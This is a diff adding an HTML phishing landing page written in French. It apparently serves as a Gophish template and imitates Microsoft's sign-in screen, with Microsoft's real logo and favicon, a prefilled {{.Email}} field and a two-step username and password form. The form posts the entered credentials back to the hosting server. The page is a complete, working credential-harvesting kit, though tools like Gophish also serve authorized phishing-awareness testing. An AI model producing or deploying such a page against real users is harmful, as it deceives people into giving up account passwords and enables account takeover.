@@ -1,0 +1,110 @@
+<!DOCTYPE html><html lang="fr"><head><meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1"/>
+	<title>Connectez-vous à votre compte</title>
+	<link href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayr6nnvthuvnshg_ubg2.ico" rel="shortcut icon"/>
+	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet"/>
+	<style type="text/css">body {
+            margin: 0;
+            background-image: url('https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/mslogin.png?raw=true');
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+        }
+
+        .login-container {
+            background: white;
+            padding: 40px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 440px;
+            width: 100%;
+        }
+
+        .login-header img { width: 108px; margin-bottom: 15px; }
+        
+        h2 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-top: 5px; }
+
+        .form-control {
+            border: none;
+            border-bottom: 1px solid #666;
+            border-radius: 0;
+            padding-left: 0;
+            font-size: 15px;
+        }
+
+        .form-control:focus {
+            border-bottom: 2px solid #0067b8;
+            box-shadow: none;
+        }
+
+        .btn-primary {
+            background-color: #0067b8;
+            border-color: #0067b8;
+            color: white;
+            border-radius: 0;
+            width: 108px;
+            float: right;
+        }
+
+        .btn-primary:hover { background-color: #005da6; color: white; }
+
+        .email-container { display: flex; align-items: center; margin-bottom: 15px; cursor: pointer; }
+        
+        .back-button {
+            width: 20px; height: 20px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>') no-repeat;
+            border: none; margin-right: 10px;
+        }
+
+        .footer-bottom {
+            position: fixed; bottom: 0; right: 0; padding: 10px; font-size: 12px;
+        }
+        .footer-bottom a { color: #000; margin-left: 10px; text-decoration: none; }
+	</style>
+</head>
+<body>
+<div class="login-container">
+<div class="login-header" id="headerSection"><img alt="Microsoft" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"/>
+<h2 id="titleText">Se connecter</h2>
+</div>
+
+<form action="" method="POST">
+<div id="emailGroup"><input class="form-control" id="email" name="username" placeholder="E-mail, téléphone ou Skype" required="" type="email" value="{{.Email}}"/>
+<p style="font-size: 13px; margin-top: 15px;">Pas de compte ? <a href="#">Créez-en un !</a></p>
+<button class="btn btn-primary" onclick="showPassword()" type="button">Suivant</button></div>
+
+<div id="passwordGroup" style="display: none;">
+<div class="email-container" onclick="showEmail()">
+<div class="back-button"> </div>
+</div>
+<input class="form-control" id="password" name="password" placeholder="Mot de passe" required="" type="password"/>
+<p style="font-size: 13px; margin-top: 15px;"><a href="#">Mot de passe oublié ?</a></p>
+<button class="btn btn-primary" type="submit">Se connecter</button></div>
+</form>
+</div>
+
+<div class="footer-bottom"><a href="#">Conditions d&#39;utilisation</a> <a href="#">Confidentialité et cookies</a> <span>...</span></div>
+<script>
+    function showPassword() {
+        const email = document.getElementById('email').value;
+        if(email.length < 3) return;
+
+        // Mise à jour visuelle
+        document.getElementById('emailGroup').style.display = 'none';
+        document.getElementById('passwordGroup').style.display = 'block';
+        document.getElementById('titleText').innerText = 'Entrez le mot de passe';
+        document.getElementById('displayEmail').innerText = email;
+    }
+
+    function showEmail() {
+        // Retour à la vue email
+        document.getElementById('passwordGroup').style.display = 'none';
+        document.getElementById('emailGroup').style.display = 'block';
+        document.getElementById('titleText').innerText = 'Se connecter';
+    }
+</script>
+
+</body></html>
